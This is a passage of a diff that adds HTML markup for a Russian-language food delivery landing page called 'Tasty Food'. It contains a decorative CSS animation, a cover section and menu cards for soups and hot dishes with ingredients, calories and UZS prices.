1447px 855px rgba(255, 255, 255, 0.70), 1447px 1810px rgba(255, 255, 255, 0.70), 1461px 952px rgba(255, 255, 255, 0.70), 1461px 1907px rgba(255, 255, 255, 0.70), 3px 788px rgba(255, 255, 255, 0.70), 3px 1743px rgba(255, 255, 255, 0.70), 1289px 678px rgba(255, 255, 255, 0.70), 1289px 1633px rgba(255, 255, 255, 0.70), 876px 897px rgba(255, 255, 255, 0.70), 876px 1852px rgba(255, 255, 255, 0.70), 296px 734px rgba(255, 255, 255, 0.70), 296px 1689px rgba(255, 255, 255, 0.70), 1854px 255px rgba(255, 255, 255, 0.70), 1854px 1210px rgba(255, 255, 255, 0.70), 1547px 171px rgba(255, 255, 255, 0.70), 1547px 1126px rgba(255, 255, 255, 0.70), 669px 414px rgba(255, 255, 255, 0.70), 669px 1369px rgba(255, 255, 255, 0.70), 263px 922px rgba(255, 255, 255, 0.70), 263px 1877px rgba(255, 255, 255, 0.70), 1047px 274px rgba(255, 255, 255, 0.70), 1047px 1229px rgba(255, 255, 255, 0.70), 894px 918px rgba(255, 255, 255, 0.70), 894px 1873px rgba(255, 255, 255, 0.70), 1043px 404px rgba(255, 255, 255, 0.70), 1043px 1359px rgba(255, 255, 255, 0.70), 1423px 210px rgba(255, 255, 255, 0.70), 1423px 1165px rgba(255, 255, 255, 0.70), 871px 58px rgba(255, 255, 255, 0.70), 871px 1013px rgba(255, 255, 255, 0.70), 1761px 863px rgba(255, 255, 255, 0.70), 1761px 1818px rgba(255, 255, 255, 0.70), 688px 350px rgba(255, 255, 255, 0.70), 688px 1305px rgba(255, 255, 255, 0.70), 1652px 577px rgba(255, 255, 255, 0.70), 1652px 1532px rgba(255, 255, 255, 0.70), 143px 426px rgba(255, 255, 255, 0.70), 143px 1381px rgba(255, 255, 255, 0.70), 1673px 645px rgba(255, 255, 255, 0.70), 1673px 1600px rgba(255, 255, 255, 0.70), 256px 445px rgba(255, 255, 255, 0.70), 256px 1400px rgba(255, 255, 255, 0.70), 1544px 52px rgba(255, 255, 255, 0.70), 1544px 1007px rgba(255, 255, 255, 0.70), 1133px 654px rgba(255, 255, 255, 0.70), 1133px 1609px rgba(255, 255, 255, 0.70), 1436px 611px rgba(255, 255, 255, 0.70), 1436px 1566px rgba(255, 255, 255, 0.70), 565px 287px rgba(255, 255, 255, 0.70), 565px 1242px rgba(255, 255, 255, 0.70), 868px 27px rgba(255, 255, 255, 0.70), 868px 982px rgba(255, 255, 255, 0.70), 1001px 142px rgba(255, 255, 255, 0.70), 1001px 1097px rgba(255, 255, 255, 0.70), 1px 38px rgba(255, 255, 255, 0.70), 1px 993px rgba(255, 255, 255, 0.70), 1897px 117px rgba(255, 255, 255, 0.70), 1897px 1072px rgba(255, 255, 255, 0.70), 186px 720px rgba(255, 255, 255, 0.70), 186px 1675px rgba(255, 255, 255, 0.70), 435px 16px rgba(255, 255, 255, 0.70), 435px 971px rgba(255, 255, 255, 0.70), 1833px 191px rgba(255, 255, 255, 0.70), 1833px 1146px rgba(255, 255, 255, 0.70), 938px 543px rgba(255, 255, 255, 0.70), 938px 1498px rgba(255, 255, 255, 0.70), 1498px 568px rgba(255, 255, 255, 0.70), 1498px 1523px rgba(255, 255, 255, 0.70), 991px 532px rgba(255, 255, 255, 0.70), 991px 1487px rgba(255, 255, 255, 0.70), 313px 370px rgba(255, 255, 255, 0.70), 313px 1325px rgba(255, 255, 255, 0.70), 952px 798px rgba(255, 255, 255, 0.70), 952px 1753px rgba(255, 255, 255, 0.70), 1577px 762px rgba(255, 255, 255, 0.70), 1577px 1717px rgba(255, 255, 255, 0.70), 1884px 930px rgba(255, 255, 255, 0.70), 1884px 1885px rgba(255, 255, 255, 0.70), 1266px 795px rgba(255, 255, 255, 0.70), 1266px 1750px rgba(255, 255, 255, 0.70), 1772px 594px rgba(255, 255, 255, 0.70), 1772px 1549px rgba(255, 255, 255, 0.70), 641px 708px rgba(255, 255, 255, 0.70), 641px 1663px rgba(255, 255, 255, 0.70), 353px 329px rgba(255, 255, 255, 0.70), 353px 1284px rgba(255, 255, 255, 0.70), 140px 271px rgba(255, 255, 255, 0.70), 140px 1226px rgba(255, 255, 255, 0.70), 721px 284px rgba(255, 255, 255, 0.70), 721px 1239px rgba(255, 255, 255, 0.70), 106px 141px rgba(255, 255, 255, 0.70), 106px 1096px rgba(255, 255, 255, 0.70), 898px 443px rgba(255, 255, 255, 0.70), 898px 1398px rgba(255, 255, 255, 0.70), 1291px 133px rgba(255, 255, 255, 0.70), 1291px 1088px rgba(255, 255, 255, 0.70), 144px 341px rgba(255, 255, 255, 0.70), 144px 1296px rgba(255, 255, 255, 0.70), 694px 595px rgba(255, 255, 255, 0.70), 694px 1550px rgba(255, 255, 255, 0.70), 123px 24px rgba(255, 255, 255, 0.70), 123px 979px rgba(255, 255, 255, 0.70), 144px 513px rgba(255, 255, 255, 0.70), 144px 1468px rgba(255, 255, 255, 0.70), 1411px 222px rgba(255, 255, 255, 0.70), 1411px 1177px rgba(255, 255, 255, 0.70), 1676px 470px rgba(255, 255, 255, 0.70), 1676px 1425px rgba(255, 255, 255, 0.70), 20px 553px rgba(255, 255, 255, 0.70), 20px 1508px rgba(255, 255, 255, 0.70), 91px 601px rgba(255, 255, 255, 0.70), 91px 1556px rgba(255, 255, 255, 0.70), 1095px 502px rgba(255, 255, 255, 0.70), 1095px 1457px rgba(255, 255, 255, 0.70), 1838px 70px rgba(255, 255, 255, 0.70), 1838px 1025px rgba(255, 255, 255, 0.70), 845px 894px rgba(255, 255, 255, 0.70), 845px 1849px rgba(255, 255, 255, 0.70), 108px 401px rgba(255, 255, 255, 0.70), 108px 1356px rgba(255, 255, 255, 0.70), 736px 589px rgba(255, 255, 255, 0.70), 736px 1544px rgba(255, 255, 255, 0.70), 424px 456px rgba(255, 255, 255, 0.70), 424px 1411px rgba(255, 255, 255, 0.70), 1753px 384px rgba(255, 255, 255, 0.70), 1753px 1339px rgba(255, 255, 255, 0.70), 377px 581px rgba(255, 255, 255, 0.70), 377px 1536px rgba(255, 255, 255, 0.70), 239px 347px rgba(255, 255, 255, 0.70), 239px 1302px rgba(255, 255, 255, 0.70), 69px 690px rgba(255, 255, 255, 0.70), 69px 1645px rgba(255, 255, 255, 0.70), 1514px 542px rgba(255, 255, 255, 0.70), 1514px 1497px rgba(255, 255, 255, 0.70), 975px 425px rgba(255, 255, 255, 0.70), 975px 1380px rgba(255, 255, 255, 0.70), 1439px 145px rgba(255, 255, 255, 0.70), 1439px 1100px rgba(255, 255, 255, 0.70), 862px 426px rgba(255, 255, 255, 0.70), 862px 1381px rgba(255, 255, 255, 0.70), 1001px 482px rgba(255, 255, 255, 0.70), 1001px 1437px rgba(255, 255, 255, 0.70), 521px 808px rgba(255, 255, 255, 0.70), 521px 1763px rgba(255, 255, 255, 0.70), 342px 165px rgba(255, 255, 255, 0.70), 342px 1120px rgba(255, 255, 255, 0.70), 1662px 767px rgba(255, 255, 255, 0.70), 1662px 1722px rgba(255, 255, 255, 0.70), 1407px 896px rgba(255, 255, 255, 0.70), 1407px 1851px rgba(255, 255, 255, 0.70), 960px 319px rgba(255, 255, 255, 0.70), 960px 1274px rgba(255, 255, 255, 0.70);
+                    animation-duration: 72s;
+                    animation-name: t826__galaxy-rec79851894
+                }
+
+                .t826__galaxy-far-rec79851894:after {
+                    content: ' ';
+                    position: absolute;
+                    top: 955px
+                }
+            </style>
+            <!-- cover -->
+            <div class="t-cover" id="recorddiv79851894" bgimgfield="img"
+                style="height:100vh; background-image: url(https://media.admagazine.ru/photos/614093f84f75811b63e1cd70/16:9/w_2560%2Cc_limit/4.jpg);">
+
+                <div class="t-cover__filter"
+                    style="height:100vh;background-image: -moz-linear-gradient(top, rgba(0,0,0,0.50), rgba(0,0,0,0.50));background-image: -o-linear-gradient(top, rgba(0,0,0,0.50), rgba(0,0,0,0.50));background-image: -ms-linear-gradient(top, rgba(0,0,0,0.50), rgba(0,0,0,0.50));background-image: linear-gradient(top, rgba(0,0,0,0.50), rgba(0,0,0,0.50));filter: progid:DXImageTransform.Microsoft.gradient(startColorStr='#4c000000', endColorstr='#33000000');">
+                </div>
+                <div data-galaxy-id="79849679" class="t826__galaxy"
+                    style="background-image: -webkit-linear-gradient(rgba(0, 0, 0, 0.9), rgba(20, 39, 112, 0.8)); position: absolute; z-index: 0;">
+                    <div class="t826__galaxy-wrapper"
+                        style="animation-name: t826__galaxy-fadeIn;">
+                        <div
+                            class="t826__galaxy-far t826__galaxy-far-rec79851894">
+                        </div>
+                        <div
+                            class="t826__galaxy-mid t826__galaxy-mid-rec79851894">
+                        </div>
+                        <div
+                            class="t826__galaxy-near t826__galaxy-near-rec79851894">
+                        </div>
+                    </div>
+                </div>
+                <div class="t-container">
+                    <div class="t-width t-width_10" style="margin:0 auto;">
+                        <div class="t-cover__wrapper t-valign_middle"
+                            style="height:100vh; position: relative;z-index:1;">
+                            <div class="t182">
+                                <div data-hook-content="covercontent">
+                                    <div class="t182__wrapper">
+                                        <div class="t182__title t-title t-title_xl"
+                                            style="margin-bottom:-20px; font-size:35px;"
+                                            field="title">Доставка еды и
+                                            продуктов</div>
+                                        <div class="t182__title t-title t-title_xl"
+                                            style="" field="title">Tasty Food
+                                        </div>
+                                        <div class="t182__descr t-descr t-descr_lg"
+                                            style="" field="descr">Заказать еду
+                                            с доставкой на дом или в офис. <br>
+                                        </div>
+                                        <div class="t182__descr t-descr t-descr_lg"
+                                            style="" field="descr">Быстрая
+                                            доставка — от 15 минут! <br></div>
+                                        <div class="t182__buttons">
+                                            <a href="#rec80994492" target=""
+                                                class="t-btn "
+                                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                                <table
+                                                    style="width:100%; height:100%;">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td>Перейти к заказу
+                                                            </td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <style>
+                #rec79851894 .t-btn[data-btneffects-first],
+                #rec79851894 .t-btn[data-btneffects-second],
+                #rec79851894 .t-submit[data-btneffects-first],
+                #rec79851894 .t-submit[data-btneffects-second] {
+                    position: relative;
+                    overflow: hidden;
+                    -webkit-transform: translate3d(0, 0, 0);
+                    transform: translate3d(0, 0, 0);
+                }
+            </style>
+            <script type="text/javascript">
+                $(document).ready(function () {});
+            </script>
+        </div>
+        <div id="rec80988553" class="r t-rec" style=" "
+            data-animationappear="off" data-record-type="506">
+            <!-- T506 -->
+            <!-- cover -->
+            <div class="t-cover" id="recorddiv80988553" bgimgfield="img"
+                style="height:600px; background-image:url('https://www.koolinar.ru/all_image/enciclopedias/2/2017/enc-02e74686-b6ee-4595-af04-bdcc493b5652_large.jpg');">
+                <div class="t-cover__carrier" id="coverCarry80988553"
+                    data-content-cover-id="80988553"
+                    data-content-cover-bg="img/1maxresdefault.jpg"
+                    data-content-cover-height="600px"
+                    data-content-cover-parallax=""
+                    style="height:600px;background-attachment:scroll; " src="">
+                </div>
+                <div class="t-cover__filter"
+                    style="height:600px;background-image: -moz-linear-gradient(top, rgba(0,0,0,0.50), rgba(0,0,0,0.50));background-image: -webkit-linear-gradient(top, rgba(0,0,0,0.80), rgba(0,0,0,0.80));background-image: -o-linear-gradient(top, rgba(0,0,0,0.80), rgba(0,0,0,0.80));background-image: -ms-linear-gradient(top, rgba(0,0,0,0.80), rgba(0,0,0,0.80));background-image: linear-gradient(top, rgba(0,0,0,0.80), rgba(0,0,0,0.80));filter: progid:DXImageTransform.Microsoft.gradient(startColorStr='#33000000', endColorstr='#33000000');">
+                </div>
+                <div class="t506">
+                    <div class="t-container">
+                        <div class="t-cover__wrapper t-valign_middle"
+                            style="height:600px;">
+                            <div class="t506__wrapper"
+                                data-hook-content="covercontent">
+                                <div class="t506__topsection">
+                                    <div class="t-col t-col_12">
+                                        <div
+                                            class="t-section__topwrapper t-align_center">
+                                            <div class="t-section__title t-title t-title_xs"
+                                                field="btitle">Почему именно мы?
+                                            </div>
+                                            <div class="t-section__descr t-descr t-descr_xl t-margin_auto"
+                                                field="bdescr">Лучшие цены,
+                                                большой ассортимент, известные
+                                                бренды!</div>
+                                        </div>
+                                    </div>
+                                    <div class="t-clear"></div>
+                                </div>
+                                <div class="t506__blockswrapper">
+                                    <div class="t506__col t-col t-col_4 t-item">
+                                        <div class="t506__title t-title t-title_xl"
+                                            style="" field="title">20+</div>
+                                        <div class="t506__line"
+                                            style=" height: 1px; opacity:0.20;">
+                                        </div>
+                                        <div class="t506__text t-descr t-descr_sm"
+                                            style="" field="descr">Городов</div>
+                                    </div>
+                                    <div class="t506__col t-col t-col_4 t-item">
+                                        <div class="t506__title t-title t-title_xl"
+                                            style="" field="title2">Множество
+                                        </div>
+                                        <div class="t506__line"
+                                            style=" height: 1px; opacity:0.20;">
+                                        </div>
+                                        <div class="t506__text t-descr t-descr_sm"
+                                            style="" field="descr2">Довольных
+                                            клиентов<br></div>
+                                    </div>
+                                    <div class="t506__col t-col t-col_4 t-item">
+                                        <div class="t506__title t-title t-title_xl"
+                                            style="" field="title3">24/7</div>
+                                        <div class="t506__line"
+                                            style=" height: 1px; opacity:0.20;">
+                                        </div>
+                                        <div class="t506__text t-descr t-descr_sm"
+                                            style="" field="descr3">Работаем
+                                            круглосуточно, без выходных.<br>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <script type="text/javascript">
+                $(document).ready(function () {
+                    $('.t506').bind('displayChanged', function () {
+                        var t506_el = $("#rec80988553");
+                        t506_el.find("div[data-hook-content]")
+                            .css('height', 'auto');
+                        var t506_hcover = t506_el.find(
+                            ".t-cover").height();
+                        var t506_hcontent = t506_el.find(
+                                "div[data-hook-content]")
+                            .outerHeight();
+                        if (t506_hcontent > 300 && t506_hcover <
+                            t506_hcontent) {
+                            var t506_hcontent = t506_hcontent +
+                                120;
+                            if (t506_hcontent > 1000) {
+                                t506_hcontent += 100;
+                            }
+                            t506_el.find(".t-cover").height(
+                                t506_hcontent);
+                            t506_el.find(".t-cover__filter")
+                                .height(t506_hcontent);
+                            t506_el.find(".t-cover__carrier")
+                                .height(t506_hcontent);
+                            t506_el.find(".t-cover__wrapper")
+                                .height(t506_hcontent);
+                            if ($isMobile == false) {
+                                setTimeout(function () {
+                                    var t506_divvideo =
+                                        t506_el.find(
+                                            ".t-cover__carrier"
+                                            );
+                                    if (t506_divvideo
+                                        .find('iframe')
+                                        .length > 0) {
+                                        setWidthHeightYoutubeVideo
+                                            (t506_divvideo,
+                                                t506_hcontent +
+                                                'px');
+                                    }
+                                }, 2000);
+                            }
+                        }
+                    });
+                });
+            </script>
+        </div>
+        <div id="rec80994492" class="r t-rec t-rec_pt_30 t-rec_pb_150"
+            style="padding-top:30px;padding-bottom:150px; "
+            data-animationappear="off" data-record-type="599">
+            <!-- T599 -->
+            <br>
+            <div class="t599">
+                <div class="t-section__container t-container">
+                    <div class="t-col t-col_12">
+                        <div class="t-section__topwrapper t-align_center">
+                            <div class="t-section__title t-title t-title_xs"
+                                field="btitle">
+                                <font color="#0000CD">Супы</font>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="t-container t599__withfeatured">
+                    <!-- 1 суп -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title" style="height: 59px;">Солянка
+                                мясная</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle" style="height: 22px;">250 г 60
+                                ккал<br></div>
+                            <img src="/views/food/337003438_m650_1a7ac37fd4bc0d65d854aec85a8efe9b8838424797b1.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price" style="height: 52px;">UZS
+                                21394<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: Солянка мясная сборная (бульон
+                                        говяжий (вода питьевая, говяжьи кости
+                                        с/м, лук репчатый свежий, морковь
+                                        столовая свежая, сельдерей корень
+                                        свежий, соль поваренная пищевая,
+                                        чеснок свежий), заправка (огурцы соленые
+                                        (огурцы свежие, уксус столовый
+                                        9%, соль пищев. 60 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Солянка мясная=21394"
+                                target="_blank" class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 2 суп -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title2" style="height: 59px;">Борщ с
+                                мясом (говядина)</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle2" style="height: 22px;">250 г 80
+                                ккал<br></div>
+                            <img src="/views/food/329082344_m650_0b6cab8d3418d5fa62595327859463250454f325c171.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price2" style="height: 52px;">UZS
+                                18150<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr2" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: борщ п/ф, говядина отварная
+                                        крупным куском (говядина, соль), сало с
+                                        чесноком (шпик свиной, чеснок
+                                        свежий), куриный бульон, укроп, петрушка
+                                        листовая, чеснок свежий; борщ
+                                        п/ф: бульон говяжий, свекла, картофель,
+                                        капуста белокочанная, томат,
+                                        перец слад. 80 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Борщ с мясом (говядина)=18150"
+                                target="" class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 3 суп -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title3" style="height: 59px;">Суп-лапша
+                                куриная</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle3" style="height: 22px;">250 г 65
+                                ккал<br></div>
+                            <img src="/views/food/329082345_m650_e77814d41e94b6e4c0f19f8b6bec9d1d22d190e36891.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price3" style="height: 52px;">UZS
+                                16122<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr3" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: куриный бульон для лапши (вода
+                                        питьевая, суповой набор (курица) с/м,
+                                        курица бедро с/м, лук репчатый
+                                        свежий, морковь столовая свежая, соль
+                                        поваренная пищевая), лук репчатый,
+                                        морковь, филе куриное отварное,
+                                        макаронные изделия "Гальяни", масло
+                                        подсолн. 65 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Суп-лапша куриная=16122" target=""
+                                class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+
+                </div>
+
+                <!-- Горячие блюда  -->
+                <br>
+                <div class="t-section__container t-container">
+                    <div class="t-col t-col_12">
+                        <div class="t-section__topwrapper t-align_center">
+                            <div class="t-section__title t-title t-title_xs"
+                                field="btitle">
+                                <font color="#0000CD">Горячие блюда</font>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="t-container t599__withfeatured">
+                    <!-- 1 горячее блюдо -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title" style="height: 59px;">Жюльен
+                                грибной</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle" style="height: 22px;">80 г 108
+                                ккал<br></div>
+                            <img src="/views/food/332459949_m650_ecd7eec00aff9e2696efbd76de4b05d9c14c90e4d918.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price" style="height: 52px;">UZS
+                                13384<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: грибы шампиньоны в соусе
+                                        жульен, сыр гауда; грибы шампиньоны в
+                                        соусе жульен: соус бешамель (вода
+                                        питьевая, молоко ультрапастеризованное
+                                        м.д.ж. 3,2%, мука пшеничная в/с,
+                                        масло подсолнечное рафинированное
+                                        дезодорированное, продукт
+                                        растительно-сливоч. 108 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Жюльен грибной=13384"
+                                target="_blank" class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 2 горячее блюдо -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title2" style="height: 59px;">Шашлык из
+                                курицы</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle2" style="height: 22px;">250 г 80
+                                ккал<br></div>
+                            <img src="/views/food/313991763_m650_b91fb5dc6c81fe59f1b6a3d575113a429138a92214cf.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price2" style="height: 52px;">UZS
+                                38125<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr2" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: П/ф мясо куриное для шашлыка (с
+                                        соком лимона), масло подсолнечное
+                                        рафинированное; п/ф мясо куриное для
+                                        шашлыка (с соком лимона): филе бедра
+                                        куриное, лук репчатый, соевый соус
+                                        (соевые бобы, мука пшеничная, консервант
+                                        е202), чеснок, масло
+                                        подсолнечное, сок л. 220 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Шашлык из курицы=38125" target=""
+                                class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 3 горячее блюдо -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title3" style="height: 59px;">Мясо
+                                по-французски</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle3" style="height: 22px;">140 г
+                                460 ккал<br></div>
+                            <img src="/views/food/313991768_m650_07b266037ca3d3298a62dde58fed57a88e97f174a80a.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price3" style="height: 52px;">UZS
+                                23220<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr3" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: вырезка говяжья, майонез, лук
+                                        репчатый, сыр гауда, мука в/с, петрушка,
+                                        яичный желток, крахмал,
+                                        лимонная кислота, кетчуп, соевый соус,
+                                        лимонный концентрат, перец
+                                        черный, соль, шампиньоны жареные,
+                                        грибной бульон, соль, укроп, соль,
+                                        куриный бульон. 460 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Мясо по-французски=23220" target=""
+                                class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+
+                </div>
+                <br>
+                <div class="t-container t599__withfeatured">
+                    <!-- 4 горячее блюдо -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title" style="height: 59px;">Шницель
+                                куриный</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle" style="height: 22px;">90 г 255
+                                ккал<br></div>
+                            <img src="/views/food/307165991_m650_9668bc763d28fe7d201fdf16f94155f9334660e63317.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price" style="height: 52px;">UZS
+                                15108<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: филе куриное маринованное (филе
+                                        грудки куриной, чеснок свежий, соль,
+                                        перец черный) изделия
+                                        хлебобулочные из пшеничной муки высшего
+                                        сорта замороженные, жир для
+                                        фритюра жидкий, мука в/с молоко
+                                        ультрапастеризованное 3,2%, яйцо
+                                        столовое отборное мытое. 255 ккал/100 г
+                                    </li>
+                                </ul>
+                            </div>
+                            <a href="#order:Шницель куриный=15108"
+                                target="_blank" class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 5 горячее блюдо -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title2" style="height: 59px;">Котлета
+                                пожарская</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle2" style="height: 22px;">90 г 445
+                                ккал<br></div>
+                            <img src="/views/food/325680590_m650_56f2268ae106f030a078620d22bd7ee304474098bb91.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price2" style="height: 52px;">UZS
+                                16122<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr2" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: котлета пожарская обжаренная
+                                        (мясо куриное, хлеб пшеничный (мука
+                                        пшеничная, вода, сахар, масло
+                                        подсолнечное, соль, дрожжи
+                                        хлебопекарные), сливки, льезон (вода,
+                                        яйцо
+                                        куриное, мука пшеничная, соль), масло
+                                        сливочное, масло подсолнечное, лук
+                                        репчатый. 445 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Котлета пожарская=16122" target=""
+                                class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
+                                            <td>Добавить в корзину</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </a>
+                        </div>
+                    </div>
+                    <!-- 6 горячее блюдо -->
+                    <div class="t599__col t-col t-col_4 t-align_center ">
+                        <div class="t599__content"
+                            style="border: 1px solid #e0e6ed; border-radius: 9px;">
+                            <div class="t599__title t-name t-name_lg"
+                                field="title3" style="height: 59px;">Зраза из
+                                индейки с сыром моцарелла</div>
+                            <div class="t599__subtitle t-descr t-descr_xxs"
+                                field="subtitle3" style="height: 22px;">80 г 380
+                                ккал<br></div>
+                            <img src="/views/food/325680607_m650_dcc1b22241da226d240732664bd97cba26de85f79362.webp"
+                                style="width:200px;">
+                            <div class="t599__price t-title t-title_xs"
+                                field="price3" style="height: 52px;">UZS
+                                16122<br></div>
+                            <div class="t599__descr t-descr t-descr_xs"
+                                field="descr3" style="height: 268px;">
+                                <ul>
+                                    <li>Состав: котлета из индейки с сыром
+                                        (курица бедро на кости, курица филе
+                                        грудки, лук репчатый, индейка филе
+                                        грудки, хлеб белый нарезной, молоко
+                                        ультрапастеризованное 3,2 %, сыр
+                                        моцарелла, масло сливочное, соль, масло
+                                        подсолнечное, укроп, перец
+                                        черный горошек. 380 ккал/100 г</li>
+                                </ul>
+                            </div>
+                            <a href="#order:Зраза из индейки с сыром моцарелла=16122"
+                                target="" class="t599__btn t-btn t-btn_sm"
+                                style="color:#ffffff;background-color:Teal;border-radius:30px; -moz-border-radius:30px; -webkit-border-radius:30px;">
+                                <table style="width:100%; height:100%;">
+                                    <tbody>
+                                        <tr>
